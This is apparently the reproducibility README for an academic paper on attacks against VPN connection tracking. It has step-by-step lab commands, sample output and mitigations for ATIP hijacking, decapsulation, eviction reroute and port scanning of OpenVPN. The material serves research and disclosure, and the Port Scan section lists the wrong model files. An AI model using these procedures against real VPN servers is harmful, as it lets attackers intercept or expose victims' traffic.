# README 

Paper title: **Attacking Connection Tracking Frameworks as used by Virtual Private Networks**

Artifacts HotCRP Id: **#161**

Requested Badge: **Reproducible**

## Description

This artifact covers the four attacker against VPNs described in our paper. There are two different sets of code, one related to the attack proof-of-concepts, in the `virt-lab` directory, and one for the formal model code in the `Tla` directory. For the attack code, the three attacks, `ATIP`, `decapsulation`, and `port scan` are relatively easy to verify. The `eviction reroute` may take some effort and because of this we have included a packet capture of a successful attack against WireGuard under the `data/eviction-reroute/` directory.

### Security/Privacy Issues and Ethical Concerns

There are not ethical concerns for artifact reviewers or their machines. The primary ethical factors relate to
vulnerability disclosure, which we have already performed. 

## Basic Requirements

### Hardware Requirements

#### Attack Code

This environment has been tested on an Ubuntu 20.04 laptop with 16 GB RAM and 4 CPU cores. The total memory consumption is 10 GB RAM. Each VM is built from a 42GB VDI, but the total storage footprint should be less than that. 

#### Formal Model

The minimum working examples of the formal model was run on the same hardware as the attack code. For the paper, we ran the code with a depth of 9 which generates over 2 million states. This depth was tested on a machine with 250 GB RAM.

### Software Requirements: 

#### Attack Code

The attack were tested on an Ubuntu 20.04 host running VirtualBox for virtualization and Vagrant for provisioning the test environment.
Vagrant is a software for provisioning virtual machines. VirtualBox is used as for the testing enironment.

#### Formal Model

The formal models were tested on an Ubuntu 20.04 OS and require the TLA+ toolbox. Instructions for downloading
and installing the TLA+ toolbox can be found [here](https://lamport.azurewebsites.net/tla/toolbox.html).

### Estimated Time and Storage Consumption

#### Attack Code

It should take between 5-15 minutes to verify each of the `ATIP`, `decapsulation`, and `port scan` attacks, so 15-45 minutes. The `eviction reroute` attack could take much longer. The average time to success was about 30 minutes, but some of the runs took much longer, on the order of an hour or more of manually switching between VMs, running code, etc.

#### Formal Model

The provided examples should run in under 10 minutes and will not consume more than 10 GB memory.

## Environment

### Accessibility

The artifact can be found at the following github [link](https://github.com/bmixonba/network-alchemy-dev) on the main branch.

```bash

$ git clone https://github.com/bmixonba/network-alchemy-dev.git

```

### Attack Code

This artifact contains code to implement the four attacks covered in the paper.
The attack code is run in a virtual environment that is setup and configured using Vagrant.
The provisioning code has only been tested on a Ubuntu 20.04 operating system.
#### Set up the environment

The attack code can be run inside a virtual environment generated using the `Vagrantfile` (`virt-lab/Vagrantfile`). Use
the `boot_all.sh` script to build the environment.

```bash
$ git clone https://github.com/bmixonba/network-alchemy-dev.git
$ cd network-alchemy-dev/virt-lab/
$ ./boot_all.sh
```

The boot script will generate lots of output related to setup and configuration. Once this 
is complete, you can ssh into the environment. The following example describes how to
ssh into `attacker`.

```bash
$ vagrant ssh attacker
```
There are more detailed instructions for performing the attacks in `virt-lab/README.md`

#### Testing the Environment

There are four attacks total, `atip`, `decapsulation`, `eviction reroute`, and `port scan`. To ease reproduction, we have provided
detailed instructions for each attack in `virt-lab/README.md`

### Formal Model

The formal model code, as stated above, is run in the Tla+ toolbox.

#### Formal Model Environment

This section will detail how to setup the formal models after you have downloaded and installed TLA+ Toolkit.

The general setup remains the same for the attacks. However, the invariants are different for each attack.

The common steps are detailed below.
1. Open up the `.tla` file of interest in the TLA+ Toolbox.
2. On the left side, right-click on `models` and select `New Model`. Name the model and create it.
3. Expand the `Invariants` section and choose to add a new invariant.
4. The invariant to be added varies for each attack.
5. Click the green play button at the top to start model checking.
6. Allow the model checking to complete and the verify if invariant is violated or not.

## Artifact Evaluation

### Main Results and Claims

#### Attack Code

Our paper covers four attacks against Layer 3 VPNs, such as OpenVPN, that use stateful connection tracking.
 The four attacks are `atip`, `decapsulation`, `eviction reroute`, and `port scan`. 

#### Formal Model

We also tested mitigations for these attacks using formal modeling. Each attack has two accompanying formal models. One
that is vulnerable and another that is fixed. When running the Tla+ model checker on the provided models, 
the vulnerable version will terminate early and indicate the invariant was violated. The fixed version will run to
completion and indicate theu were successful.

#### Main Result 1: ATIP 

The following provides instructions for reproducing the ATIP attack. The first subsection covers running the proof-of-concept
code in the virtual environment. The second subsection covers running the formal model code.

##### Attack Code: ATIP

The ATIP attack, described in section 3.1, permits an attacker connected to the VPN server to force a victim's VPN connection request
to be routed to them. When this happens, all the victims packets are routed through the attacker. The results are described in section 4.2.1.

##### Formal Model: ATIP

The formal model is described in Section  5.1.1.

#### Main Result 2: Decasulation

#####  Attack Code: Decasulation

The decaspsulation attack, described in section 3.2., permits an attacker to redirect a victim's packets to himself unenrypted. The
results are described in section 4.2.4.

##### Formal Model: Decasulation

The formal model decapsulation attack/mitigations are described in section 5.1.1.

#### Main Result 3: Eviction Reroute 

#####  Attack Code: Eviction Reroute

The eviction reroute attack, described in section 3.3, permits an attacker to force replies meant for the victim to himself instead. The results are described in 4.2.5.

##### Formal Model

The formal model decapsulation attack/mitigations are described in the last paragraph of section 5.1.1.

#### Main Result 4: Port Scan

#####  Attack Code: Port Scan

The port scan attack, described in section 3.4, permits an attacker to port scan a victim behind the VPN server. The results are described in section 4.2.6.

##### Formal Model: Port Scan

The formal model decapsulation attack/mitigations are described in the second to last paragraph of section 5.1.1.

### Experiments

The following

#### Experiment 1: ATIP

#####  Attack

This experiment demonstrates the `ATIP` attack, which allows an attacker to escalate from adjacent to in-path between a VPN server and client.This is achieved by overwritting the port that the VPN server normally listens on (typically 1194). The client/victim's VPN connection request is then routed to the attacker instead of being processed by the VPN server as it normally should be.


To reproduce the `ATIP` attack, execute the following steps:

1. Connect to `attacker`

```bash

$ vagrant ssh attacker

``` 

2. Connect from `attacker` to `vpnserver`

```bash

$ cd /vagrant

$ sudo openvpn /vagrant/client2.ovpn

```

3. Force packets to `victim` through the tunnel.

```bash

$ sudo /vagrant/add_victim_route.sh

```

4. Start the attack code.

```bash

$ cd /vagrant/client-to-mitm/src/

$ ./start-full-attack.sh 
Bound udp port
Starting Port fill
Sniffing VPN Request

```

5. Connect to `victim`

```bash

$ vagrant ssh victim

```

6. Connect to `vpnserver`

```bash

$ cd /vagrant

$ sudo openvpn /vagrant/client1.ovpn

```

You should see output in `attacker`'s terminal similar to the following:

```bash

$ ./start-full-attack.sh                                                                          
Bound udp port                                                                                                                                
Starting Port fill                                                                                                                            
Sniffing VPN Request                                                                                                                          
packet from victim recd                                                                                                                       
Victim sport=52655                                                                                                                            
Done, victim sport is 52655                                                                                                                   
Starting VPN Relay52655                                                                                                                       
Received victim packet to vpn server: src=192.168.1.254:52655, dst=10.8.0.6:1194:82
Victim Port Fill Complete                                                                                                                     
Received vpn packet to victim: src=192.168.2.254:1194, dst=192.168.254.254:52655   
Received victim packet to vpn server: src=192.168.1.254:52655, dst=10.8.0.6:1194:90 
Received victim packet to vpn server: src=192.168.1.254:52655, dst=10.8.0.6:1194:359
Received vpn packet to victim: src=192.168.2.254:1194, dst=192.168.254.254:52655   
Received vpn packet to victim: src=192.168.2.254:1194, dst=192.168.254.254:52655
Received vpn packet to victim: src=192.168.2.254:1194, dst=192.168.254.254:52655   
Received victim packet to vpn server: src=192.168.1.254:52655, dst=10.8.0.6:1194:90
Received victim packet to vpn server: src=192.168.1.254:52655, dst=10.8.0.6:1194:90
Received victim packet to vpn server: src=192.168.1.254:52655, dst=10.8.0.6:1194:1188
Received victim packet to vpn server: src=192.168.1.254:52655, dst=10.8.0.6:1194:1176
Received victim packet to vpn server: src=192.168.1.254:52655, dst=10.8.0.6:1194:445
Received vpn packet to victim: src=192.168.2.254:1194, dst=192.168.254.254:52655   
Received vpn packet to victim: src=192.168.2.254:1194, dst=192.168.254.254:52655

```

If you run the ```conntrack -L``` command on `vpnserver` you should see _two_ vpn connection from
`attacker`, like this:


```bash

# conntrack -L
udp      17 119 src=192.168.254.254 dst=192.168.2.254 sport=52655 dport=1194 src=192.168.2.254 dst=192.168.254.254 sport=1194 dport=52655 [ASSURED] mark=0 use=1
udp      17 119 src=10.8.0.6 dst=192.168.1.254 sport=1194 dport=52655 src=192.168.1.254 dst=192.168.2.254 sport=52655 dport=1194 [ASSURED] mark=0 use=1
tcp      6 431999 ESTABLISHED src=10.0.2.2 dst=10.0.2.15 sport=36790 dport=22 src=10.0.2.15 dst=10.0.2.2 sport=22 dport=36790 [ASSURED] mark=0 use=1
udp      17 119 src=192.168.254.254 dst=192.168.2.254 sport=45061 dport=1194 src=192.168.2.254 dst=192.168.254.254 sport=1194 dport=45061 [ASSURED] mark=0 use=1

```

This confirms that the attack succeeded.

To test the mitigation, perform the following steps

1. Connect to `vpnserver`

```bash

$ vagrant ssh vpnserver

```

2. Delete the old insecure `MASQUERADE` rule

```bash

$ /vagrant/delete_insecure_iptables_rule.sh # sudo -D POSTROUTING -s 10.0.0.0/8 -o enp0s8 -j MASQUERADE 

```

3. Add the new `SNAT` rule


```bash

$ /vagrant/mitigate_atip.sh # sudo -A POSTROUTING -s 10.0.0.0/8  -j SNAT --to-source 192.168.2.133

```

4. If you repeat the attack now, it will fail.


##### Formal Model

The vulnerable ATIP model code is in `Tla/conntrack/conntrackVulnATIP.tla`

The fixed ATIP model code is in `Tla/conntrack/conntrackFixedATIP.tla`

Add the following invariant for the ATIP attack.

```
ATIPInv=FALSE
```

Run the model checker as described above.

#### Experiment 2: Decapsulation

##### Attack code

The decapsulation attack allows an attacker to remove the encryption normally provided by the VPN server by abusing how routing works on Linux. Specifically, if a VPN client sends a packet with a destination IP equal to the VPN server IP, then the packet is sent directly to the vpn server without encryption. 

To reproduce the decapsulation attack, execute the following steps.

1. SSH to `victim`

``` bash

$ vagrant ssh victim

```
2. Added the following to `victim`'s `/etc/hosts` file to simulate having its DNS cache poisoned.

```bash

$ sudo ./simulate_dns_poisoning.sh 

```

3. Connect to the VPN server. 

```bash

$ cd /vagrant/

$ sudo openvpn /vagrant/client1.ovpn

```

4. SSH into `attacker`

```bash

$ vagrant ssh attacker

```

5. Connect to `vpnserver` from `attacker`

```bash

$ cd /vagrant

$ sudo openvpn /vagrant/client2.ovpn

```

6. Setup DNAT rule

```bash

$ sudo /vagrant/add_decap_dnat.sh

```

6. Add route to `victim`

```bash

$ /vagrant/add_victim_route.sh

```

7. Build attack code

```bash

$ cd /vagrant/client-to-mitm/src

$ make decapsulation

```

8. Start the attack code.

```bash

$ /vagrant/client-to-mitm/src/start-decapsulation.sh

```

9. Get the website `foo.com` from `victim`

```bash

$ wget foo.com

```

10. The request will be sent to be sent to `attacker` in plain text. If you take a packet capture
from `router`, you will see the SYN request in the clear, for example.

```bash
root@router1:/home/vagrant# tcpdump -ni any not port 22                                                                                       
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode                                                                    
listening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes                                                            
23:37:40.747094 IP 192.168.1.254.57136 > 192.168.2.254.80: Flags [S], seq 4001290197, win 64240, options [mss 1460,sackOK,TS val 885599970 ecr
 0,nop,wscale 7], length 0
```

This is incorrect, as 192.168.1.254 should be encapsulated in the VPN tunnel, but it is not. If you perform a `tcpdump` on `attacker`, you will see something similar.

##### Formal Model

The vulnerable Decapsulation model code is in `Tla/conntrack/conntrackVulnDecap.tla`

The fixed Decapsulation model code is in `Tla/conntrack/conntrackFixedDecap.tla`

Add the following invariant for the Decapsulation attack.

```
DecapInv=FALSE
```

Run the model checker as described above.

#### Experiment 3: Eviction Reroute 

The following covers reproducing the results for the attack code, followed by the formal model related results.

##### Attack code

The eviction reroute attack exploits the fact that the connection tracking table, where NAT translations are stored, is a shared resources. If a victim sends a packet, such as a DNS request, through the VPN server, then an attacker can force the entry to be evicted by filling the table and then replacing the victim's entry with his own entry. The response will then be routed to the attacker instead of the victim. 

The following steps will reproduce the attack. 

**NOTE: This attack involves a lot of patience and more manual intervention on
the reviewer's part than the other attacks because the attacker cannot precisely 
control the entries in the table. We have provided a pcap as well that demonstrates
the attack.** 

0.

```bash

$ vagrant ssh victim

```

1. Connect to `vpnserver` from `victim`

```bash

$ sudo openvpn /vagrant/client1.ovpn

```

2. Prep the environment in the client

```bash

$ sudo /vagrant/prep_eviction_reroute.sh

```

3. From `victim` try to get the site, `bar.com`. This will create an entry in `vpnserver`'s connection tracking table, that you can view by execution `conntrack -L` on `vpnserver` and finding `victim`' entry.

```bash

$ wget bar.com

```

4. SSH into `router1`

```bash

$  vagrant ssh router1

```

5. Start the table filling code.

```

$ cd /vagrant/

$ sudo /vagrant/eviction_reroute.sh

```

6. SSH into `attacker`

```bash

$ vagrant ssh attacker

```

7. Connect to `vpnserver` from `attacker`

```bash

$ sudo openvpn /vagrant/client2.ovpn

```

8. Configure routes

```bash

$ ./add_route.sh
$ ./add_victim_route.sh

```

9. Start the attacker side of the code

$ cd /vagrant/client-to-mitm/src

$ sudo ./eviction_reroute.sh

```
11. If you run `conntrack -L` on `vpnserver` again, and find the matching entry in the reply direction, you will eventually see that the source IP in the original direction has been replaced by the attackers. This indicates the victim's entry was replaced by the attackers.

##### Formal Model: Eviction Reroute

The vulnerable Eviction Reroute model code is in `Tla/conntrack/conntrackVulnReroute.tla`

The fixed Eviction Reroute model code is in `Tla/conntrack/conntrackFixedReroute.tla`

Add the following invariant for the Eviction Reroute attack.

```
EvictionReroute=FALSE
```

Run the model checker as described above.

#### Experiment 4: Port Scan

This section provides instructions for reproducing the Port Scan attack, followed by the formal model implementation

##### Attack code: Port Scan

The following steps will reproduce the attack. 

1. SSH into `attacker`

```bash

$ vagrant ssh attacker

```

2. Establish a VPN connection to the VPN Server

``` bash

$ cd /vagrant

$ sudo openvpn /vagrant/client2.ovpn

```

3. In a second terminal make sure packets are routed to a machine under the attacker's control

```bash

$ sudo /vagrant/add_route.sh 

```

4. From `attacker`, send packets to the machine

```bash

sudo /vagrant/udp_portscan_internal.sh

```

5. SSH to `router1`

```bash

$ vagrant ssh router1

```

6. Send packets from `router1` to `vpnserver` that match `attacker`'s packets from step 4.

```bash

$ sudo /vagrant/udp_portscan_external.sh

```

7.  Disconnect `attacker` from the VPN server (Ctrl-c in the terminal from Step 2.)

8. SSH into `victim`

```bash

$ vagrant ssh victim

```

9. Connect to `vpnserver` from `victim`

```bash

$ cd /vagrant

$ sudo openvpn /vagrant/client1.ovpn

```

10. Add a route to make sure response packets are sent through `vpnserver`

```bash

$ sudo /vagrant/add_route.sh

```

11. If you look on the `router1` terminal, you should see ICMP `port unreachable` messages. If you take
a packet capture on `victim` you should see the packets from `router1` being sent to the victim. This confirms the attack.

##### Formal Model: Port Scan 

The vulnerable Port Scan model code is in `Tla/conntrack/conntrackVulnReroute.tla`

The fixed Port Scan model code is in `Tla/conntrack/conntrackFixedReroute.tla`

Add the following invariant for the Eviction Reroute attack.

```
PortScanInv=FALSE
```

## Limitations

### OpenVPN and Linux Only
We included only OpenVPN as the VPN target, though our results also include WireGuard and OpenConnect. All of the VPNs we tested (OpenVPN, WireGuard, and OpenConnect), use Netfilter (in the case of Linux based systems), which is what our attacks are actually targeting, OpenVPN was the similast to automate and provision so we focused on it for this artifact. For operating systems, we only included Linux and not FreeBSD. This is because we were unable to find a suitable FreeBSD vagrant box and since our provisioning code uses Vagrant, and since frewer of the attacks actually work on FreeBSD, we focused on Linux.

### IPv4 Only

We tested the attacks against both IPv4 and IPv6. We include only IPv4 in this artifact for two reasons. First, because the connection tracking frameworks are shared between IPv4 and IPv6 testing both is redundent. Second, we encountered several issues when configuing IPv6 interfaces and routing that we cannot currently attribute to a cause but that make building the testing environment and code more labor intensive. 

We plan to include WireGuard, OpenConnect, and IPv6 support in future iterations of this framework.

## Notes on Reusability

Researchers can use the code within this artifact to build additional attacks or testing frameworks against VPN platforms if they wish.
